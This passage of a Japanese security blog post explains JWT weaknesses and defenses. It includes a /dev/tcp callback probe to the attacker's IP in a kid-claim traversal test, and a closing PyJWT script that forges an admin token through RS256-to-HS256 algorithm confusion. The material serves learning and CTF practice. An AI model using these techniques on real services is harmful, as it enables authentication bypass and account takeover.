例えば、"kid": "key/123" の場合は、URL の[ディレクト](http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8)リで "~/key/123" や "~\key/123.pem" にアクセスしてみます。もし、うまくアクセス制御がされていない場合は、直接的にシークレットキーを入手することができます。

### 3.4.2. kid クレームに[ディレクトリトラバーサル](http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8%A5%EA%A5%C8%A5%E9%A5%D0%A1%BC%A5%B5%A5%EB)の payload を埋め込む

先程は、kid クレームにある情報からシークレットキーを特定しようとしました。これは、kid クレームに別ファイルを[ディレクトリトラバーサル](http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8%A5%EA%A5%C8%A5%E9%A5%D0%A1%BC%A5%B5%A5%EB)の payload で埋め込ませます。それにより、攻撃者が任意で署名検証に使用するシークレットキーを別ファイルで処理をさせることができます。

まずは、この手法が試せるかを確認します。確認する方法は、いくつかあります。

- 予測可能なファイルを指定する
- "kid": "/dev/[tcp](http://d.hatena.ne.jp/keyword/tcp)/ <your IP> / <your Port> /" のように接続を確認する
- SSRF の payload を指定してレスポンスを確認する
- [SQL](http://d.hatena.ne.jp/keyword/SQL) インジェクションを利用してデータベースからシークレットキーを直接的に取得できるか確認する

これらの対策としては、一般的な[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)の対策や kid クレームの内容を検証する処理を行うことで回避することができます。

### 3.5. その他の攻撃や問題

その他の攻撃や問題として、いくつかあります。本記事では、少しだけ紹介します。

- ヘッダに新しい公開鍵を埋め込む (CVE-2018-0114)
- [XSS](http://d.hatena.ne.jp/keyword/XSS) や [CSRF](http://d.hatena.ne.jp/keyword/CSRF) の問題
- 不適切な有効期限 (exp) による問題
- 情報漏洩
- JWKS Spoofing (本記事では説明を省略します)
- Cross-Service Relay attacks (本記事では説明を省略します)

### 3.5.1. ヘッダに新しい公開鍵を埋め込む (CVE-2018-0114)

これは、JWT のヘッダに新しい公開鍵を埋め込んでサーバー側で指定した新しい公開鍵を使用させて署名の検証をさせる攻撃手法です。CVE は、[こちら](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114)になります。

この攻撃手法は、 先程も紹介した Burp Suite の[拡張機能](http://d.hatena.ne.jp/keyword/%B3%C8%C4%A5%B5%A1%C7%BD)である [JSON](http://d.hatena.ne.jp/keyword/JSON) Web Tokens を使用することで簡単に試すことができます。方法をしては、対象のリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トを Repeater タブから "Select extension ..." で "[JSON](http://d.hatena.ne.jp/keyword/JSON) Web Tokens" を選択して "CVE-2018-0114 Attack" にチェックを入れることで自動的に JWT を改ざんしてくれます。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/s/scgajge12/20201208/20201208111448.png)

### 3.5.2. [XSS](http://d.hatena.ne.jp/keyword/XSS) や [CSRF](http://d.hatena.ne.jp/keyword/CSRF) の問題

JWT を実際にリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トで送る際は、 [Cookie](http://d.hatena.ne.jp/keyword/Cookie) に含める方法と HTTP の Authorization ヘッダなどに含める方法があります。

[Cookie](http://d.hatena.ne.jp/keyword/Cookie) に JWT が含める場合は、HttpOnly 属性が付与されていれば、 [XSS](http://d.hatena.ne.jp/keyword/XSS) に関するリスクを低くすることができます。ただこれだけでは、[CSRF](http://d.hatena.ne.jp/keyword/CSRF) のリスクが高まってしまいます。そのため、SameSite 属性などを活用して [CSRF](http://d.hatena.ne.jp/keyword/CSRF) の対策も並行して行う必要があります。

また、HTTP の Authorization ヘッダに JWT が含める場合は、[JavaScript](http://d.hatena.ne.jp/keyword/JavaScript) からアクセスが可能な [Web Storage](http://d.hatena.ne.jp/keyword/Web%20Storage) などに JWT が保存されることになります。ちなみに [Web Storage](http://d.hatena.ne.jp/keyword/Web%20Storage) には、Local Storage と Session Storage があります。簡単に違いを説明すると、Local Storageは消さない限り永久的に保存されて、Session Storageはタブを閉じるまで有効な状態で保存されます。そのため Web アプリケーション上に [XSS](http://d.hatena.ne.jp/keyword/XSS) が存在した場合は、攻撃者に盗まれる可能性があります。

そのため JWT は、[XSS](http://d.hatena.ne.jp/keyword/XSS) や [CSRF](http://d.hatena.ne.jp/keyword/CSRF) などの[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)に対する対策を行った上で、[Cookie](http://d.hatena.ne.jp/keyword/Cookie) に含める実装を行う必要があります。

### 3.5.3. 不適切な有効期限 (exp) による問題

[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)には、exp クレームという有効期限の最終日時を示すものがあります。JWT が発行されてからどのくらい対象の JWT を有効として判断するかを exp クレームに終了日時を含めます。ちなみに exp クレームに入る値は、[UNIX](http://d.hatena.ne.jp/keyword/UNIX)時刻となっています。そのため日時を確認する時は、[こちら](https://keisan.casio.jp/exec/system/1526004418)のような変換ツールを利用することで日時が簡単にわかるようになります。実際にリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トに含まれていた JWT の有効期限を調べたい場合は、まず発行された日時をメモして、expクレームを先程のようなツールで変換します。そしてその2つの日時を比べて、どのくらい有効期限があるかを確認します。

有効期限の判断は、JWT の利用場面やサービスの運用方法によって様々だと思います。そのため運用上のことを考えた上で、適切な有効期限を設定するようにしてください。もし、サービスとしてきっちり運用される場合は、[ブラックリスト](http://d.hatena.ne.jp/keyword/%A5%D6%A5%E9%A5%C3%A5%AF%A5%EA%A5%B9%A5%C8)で JWT を管理することで後に無効化したい JWT があれば、管理側で使用不可能にすることができます。単純に JWT の有効期限 (exp) を短く設定しておけば、JWT が漏洩した際のリスクは低くなり、悪用される時間も短くすることが可能です。そのため、むやみに JWT の有効期限を長く設定しないようにする必要があります。

### 3.5.4. 情報漏洩

JWT は、主にアクセス制御周りでも使用されます。そのため[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)には、ユーザーに関する情報が含まれていることが多いです。もし、JWT の[トーク](http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF)ンが暗号化されていない場合は、誰でも JWT の[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)を [Base64](http://d.hatena.ne.jp/keyword/Base64) でデコードすることで情報を読み取ることができます。そのためJWT を扱う [Cookie](http://d.hatena.ne.jp/keyword/Cookie) には、適切に Secure 属性を付与してください。その上で実装・管理・運用での対策を行う必要があります。

### 3.6. 実際の[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)レポート (報告書)

HackerOne というバグバウンティプラットフォームに提出された報告書にも、いくつか JWT に[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)を突いたものがありました。

- [予測可能な JWT シークレット](https://hackerone.com/reports/896649)
- [オープンメモリダンプメソッド](https://hackerone.com/reports/783360)
- [クライアント側で生成する JWT の安全でない Zendesk SSO の実装](https://hackerone.com/reports/638635)
- [JWE の重大な脆弱性 RFC 7516 の無効な曲線攻撃](https://hackerone.com/reports/213437)

特に印象的だった報告が今年の4月に [Apple](http://d.hatena.ne.jp/keyword/Apple) Security Bounty Program に提出された「Signin with [Apple](http://d.hatena.ne.jp/keyword/Apple)」機能に関する[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)です。これを悪用すると、攻撃者が主要な[サードパーティ](http://d.hatena.ne.jp/keyword/%A5%B5%A1%BC%A5%C9%A5%D1%A1%BC%A5%C6%A5%A3)サービスでユーザーのアカウントを乗っ取ることが可能です。

> Here’s my first 6 digit bounty from @Apple. Blog post will be up next week. \#bugbounty pic.twitter.com/QygxvtGYJb
— Bhavuk Jain (@bhavukjain1) 2020年5月24日

- [Apple のサインインに関するゼロディ](https://bhavukjain.com/blog/2020/05/30/zeroday-signin-with-apple/)

### 4. セキュリティ対策やベストプ[ラク](http://d.hatena.ne.jp/keyword/%A5%E9%A5%AF)ティス

JWT のセキュアな実装方法は、[RFC 8725](https://www.rfc-editor.org/rfc/rfc8725.html) にベストプ[ラク](http://d.hatena.ne.jp/keyword/%A5%E9%A5%AF)ティスとして記載してあります。実際に JWT を利用して何かのサービスの運用に取り入れる場合は、以下の点に注意して実装する必要があると思われます。

- [アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)の検証を常に実行する
- 適切な[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を使用する
- 暗号の入力を必ず検証する
- 強力な鍵を選択する
- 使用可能な全てのクレームを検証する
- typ クレームを使用して[トーク](http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF)ンの種類を区別する
- [トーク](http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF)ンごとに異なる検証ルールを使用する
- [ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)に含める情報をよく検討する ([ユースケース](http://d.hatena.ne.jp/keyword/%A5%E6%A1%BC%A5%B9%A5%B1%A1%BC%A5%B9)依存)
- 署名検証にはライブラリなどを利用して正確に行う
- もし運用上の理由で JWT の有効期限を短くできない場合は、JWT を[ブラックリスト](http://d.hatena.ne.jp/keyword/%A5%D6%A5%E9%A5%C3%A5%AF%A5%EA%A5%B9%A5%C8)に入れて管理できるようにする (使用不可能にできる体制を整えておく)

各[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)に対しての対策は、先程のセキュリティリスクでも示したのでそちらも一緒に参考にしてみてください。

### 5. おまけ (JWT の改ざん)

おまけとして少し [Python](http://d.hatena.ne.jp/keyword/Python) のライブラリである [PyJWT](https://pypi.org/project/PyJWT/) を使って、簡単に JWT を改ざんしてみます。攻撃手法は、JWT の alg クレームに RS256 が付与されているのに対して、[RSA](http://d.hatena.ne.jp/keyword/RSA) 公開鍵を HS256 の共通鍵として使用させて有効な JWT を生成させる攻撃手法になります。

今回は、以下を想定として行います。

- Web アプリケーションにログインする際のリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トの [Cookie](http://d.hatena.ne.jp/keyword/Cookie) に含まれる JWT を改ざんする
- サーバー側で[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)の制限が none に指定できない実装になっている
- 既に公開鍵(Public Key)が手元にある

攻撃手順は、以下の通りに行います。

18. 今回対象とする JWT の構成を見てみる
19. JWT の改ざんに使用する公開鍵を確認する
20. 改ざんする部分を [Python](http://d.hatena.ne.jp/keyword/Python) の PyJWT を使用して生成・確認する
21. (実際の CTF などでは、この生成した JWT をリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トで対象に Web アプリケーションに送って検証をクリアさせる)

### 5.1. 今回対象とする JWT の構成を見てみる

実際は、ローカルプロキシである Burp Suite などで 対象の Web アプリケーションからのリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トを観測して JWT を入手します。イメージとしては以下のようなリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トの [Cookie](http://d.hatena.ne.jp/keyword/Cookie) に JWT が含まれています。

```plain text
GET / HTTP/1.1
Host: broken-jwt.com
 ...<redacted>...
Connection: close
 auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdXRoIjoiZ3Vlc3QifQ.e3UX6vGuTGHWouov4s5HuKn6B5zbe0ZjxwHCB_OQlX_TcntJuj89x0RDi8gQi88TMoXSFN-qnFUQxillB_nD5ErrVZKL8HI5Ah_iQBX1xfu097H2xT3LAhDEceq4HDEQY-iC4TVSxMGM0AS_ItsVLBIrxk8tapcANvCW_KnO3mEFwfQOD64YHtapSZJ-kKjdN19lgdI_g-2nNI83P6TlgLtZ8vo1BB1zt_8b4UECSiPb67YCsrCYIIsABq5UyxSwgUpZsM6oxW0k1c4NbaUTnUWURG2qWDVw56svRQETU3YjO59AMj67n9r9Y9NJ9FBlpHQ60Ck-mfL5JcmFE9sgVw
Upgrade-Insecure-Requests: 1
```

対象の JWT のみを切り取って、見やすく改行すると以下のようになります。

```plain text
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.
eyJhdXRoIjoiZ3Vlc3QifQ.
e3UX6vGuTGHWouov4s5HuKn6B5zbe0ZjxwHCB_OQlX_TcntJuj89x0RDi8gQi88TMoXSFN-qnFUQxillB_nD5ErrVZKL8HI5Ah_iQBX1xfu097H2xT3LAhDEceq4HDEQY-iC4TVSxMGM0AS_ItsVLBIrxk8tapcANvCW_KnO3mEFwfQOD64YHtapSZJ-kKjdN19lgdI_g-2nNI83P6TlgLtZ8vo1BB1zt_8b4UECSiPb67YCsrCYIIsABq5UyxSwgUpZsM6oxW0k1c4NbaUTnUWURG2qWDVw56svRQETU3YjO59AMj67n9r9Y9NJ9FBlpHQ60Ck-mfL5JcmFE9sgVw
```

これを [jwt.io](https://jwt.io/) で見てみるとこんな感じで簡単に中の構成を確認することができます。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/s/scgajge12/20201206/20201206231547.png)

ちなみに [Linux](http://d.hatena.ne.jp/keyword/Linux) などの[コマンドライン](http://d.hatena.ne.jp/keyword/%A5%B3%A5%DE%A5%F3%A5%C9%A5%E9%A5%A4%A5%F3)上でもデコードして確認できます。

```plain text
$ echo eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9 | base64 -d
{"typ":"JWT","alg":"RS256"}
$ echo eyJhdXRoIjoiZ3Vlc3QifQ | base64 -d
{"auth":"guest"}
```

今回の目的は、この[ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)にある auth クレームを "guest" から "admin" に改ざんします。この JWT の署名に使用されている[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)は、ヘッダを見ると RS256 でされていることがわかります。RS256 の[脆弱性](http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)について振り返ると、JWT の生成には[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0)を使って、検証には公開鍵を使用しています。

今回の想定としてサーバー側では、JWT の[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)の制限がされていません(none のみ)。そのため、ヘッダの[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を HS256 に改ざんして公開鍵で JWT を生成させます。そうすることで HS256 は、生成と検証を同一の鍵で行うことになるため有効な[トーク](http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF)ンとして改ざんした JWT を送信して、"admin" でログインができそうです。

### 5.2. JWT の改ざんに使用する公開鍵を確認する

今回の想定として既に公開鍵を取得しているとしています。以下がその公開鍵になります。

```plain text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtnREuAwK7M/jWZdSVNfN
4m+kX0rqakI6KIR/qzT/Fv7hfC5vg9UJgEaAGOfexmoDMBYTLRSHnQ9EYjF6bkCh
w+NVQCqsvy9psZVnjUHQ6QfVUdyrUcsOuRoMMaEBYp+qCegDY5Vp65Wzk05qXfvK
LJK9apOo0pPgD7fdOhpqwzejxgWxUgYvMqkGQS2aCC51ePvC6edkStNxovoDFvXk
uG69/7jEqs2k2pk5mI66MR+2U46ub8hPUk7WA6zTGHhIMuxny+7ivxYIXCqEbZGV
YhOuubXfAPrVN2UpL4YBvtfmHZMmjp2j39PEqxXU70kTk96xq3WhnYm46HhciyIz
zQIDAQAB
-----END PUBLIC KEY-----
```

この鍵を利用して JWT を[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0) HS256 で有効な JWT を生成させます。

ちなみに RS256 は、サーバー側で公開鍵を利用して署名検証を行います。そのため、この公開鍵が本当に先程の JWT の公開鍵なのかを手元で確かめることができます。試しに Burp Suite の [JSON](http://d.hatena.ne.jp/keyword/JSON) Web Tokens で署名検証をしてみると以下のようになります。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/s/scgajge12/20201209/20201209190703.png)

すると緑色の部分で "signature verified" となり、署名検証がされてこの JWT の生成に使用された[秘密鍵](http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0)に紐づいた公開鍵であることが確認することができます。(同じように jwt.io のデバッガでも検証することができます)

### 5.3. 改ざんする部分を [Python](http://d.hatena.ne.jp/keyword/Python) の PyJWT を使用して生成・確認する

今回生成したい JWT の条件を整理すると以下の3点になります。

- ヘッダの[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)を "RS256" から "HS256" に変更する
- [ペイロード](http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9)の auth クレームを "guest" から "admin" に変更する
- 署名の文字列を公開鍵を使って生成する

この条件にそって今回は、[Python](http://d.hatena.ne.jp/keyword/Python) で JWT を生成します。今回は、先程も示した PyJWT を使用します。

1点注意で今回の PyJWT は、バージョン**0.4.3** を使用します。既に PyJWT が他のバージョンでインストールされている場合は、一度アンインストールして再度指定のバージョンでインストールしてください。方法は以下のようになります。

```plain text
# 既に他のバージョンがある場合のアンインストール
$ pip3 uninstall pyjwt

# 指定の PyJWT のインストール
$ pip3 install pyjwt==0.4.3
```

指定の PyJWT をインストールできたら、以下のプログラムを作成します。

```plain text
#!/usr/bin/python3

import jwt
#pyjwt==0.4.3

pubkey = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtnREuAwK7M/jWZdSVNfN
4m+kX0rqakI6KIR/qzT/Fv7hfC5vg9UJgEaAGOfexmoDMBYTLRSHnQ9EYjF6bkCh
w+NVQCqsvy9psZVnjUHQ6QfVUdyrUcsOuRoMMaEBYp+qCegDY5Vp65Wzk05qXfvK
LJK9apOo0pPgD7fdOhpqwzejxgWxUgYvMqkGQS2aCC51ePvC6edkStNxovoDFvXk
uG69/7jEqs2k2pk5mI66MR+2U46ub8hPUk7WA6zTGHhIMuxny+7ivxYIXCqEbZGV
YhOuubXfAPrVN2UpL4YBvtfmHZMmjp2j39PEqxXU70kTk96xq3WhnYm46HhciyIz
zQIDAQAB
-----END PUBLIC KEY-----
"""

payload = {"auth": "admin"}

cookie = jwt.encode( payload, pubkey, algorithm="HS256")

print(cookie.decode())
```

これを実行すると以下のように改ざんされた JWT が生成されます。

```plain text
$ python3 broken-jwt.py
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM-1Sz-SzKvad4
```

```plain text
$ echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d
{"typ":"JWT","alg":"HS256"}
$ echo eyJhdXRoIjoiYWRtaW4ifQ | base64 -d
{"auth":"admin"}
```

これで条件にあった JWT を生成することができました。CTF などでは、改ざんした JWT をリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トで送信すると、[アルゴリズム](http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)は HS256 と認識されて同一の鍵で検証されます。そのため、有効な JWT と判断されます。

このような流れで自分の環境でも改ざんした JWT の生成を、[Python](http://d.hatena.ne.jp/keyword/Python) のプログラムによって簡単に行うことができます。

本記事では、JWT に関する実装はあまり触れませんでした。実際に動かして実装してみたい方は、ぜひ以下のような Web [フレームワーク](http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF)やライブラリを利用して実装して試してみてください。

### 6. 感想・まとめ

今回、初めて技術的な内容のブログを書いてみました (初アドカレでもあります)。内容のベースとしては、以前に自分が JWT について学習した際のメモなどを元にまとめました。個人的に、最近よく見る JWT のセキュリティに関する点を少しでも知ってもらえればと思いました。

本記事では JWT に関する実装周りの内容は、具体的に触れませんでした。もし JWT をもっと深く学びたい方は、ぜひ JWT を実装して色々と再現してみてください。その際に、本記事のセキュリティ面を少しでも参考にしてもらえると嬉しいです。あとは CTF 形式で実際にリク[エス](http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9)トで JWT が含まれていれば JWT に関する攻撃を試してみたり、[PentesterLab](https://pentesterlab.com/) にいくつか JWT に関する演習 (Pro のみ)があるのでそれををやってみたりすると更に良いと面白いと思います。やっぱり IT 技術は、実際に手を動かして学ぶことが一番吸収できることも多く、単純に楽しいと思います。

ぜひ本記事は、何かの参考にしていただければ幸いです。

今後は、Web ・ Cloud に関するセキュリティの内容やバグバウンティについてブログでアウトプットしたいと思っていますのでお楽しみに。

最後まで読んでいただきたい、ありがとうございました！

### 参考資料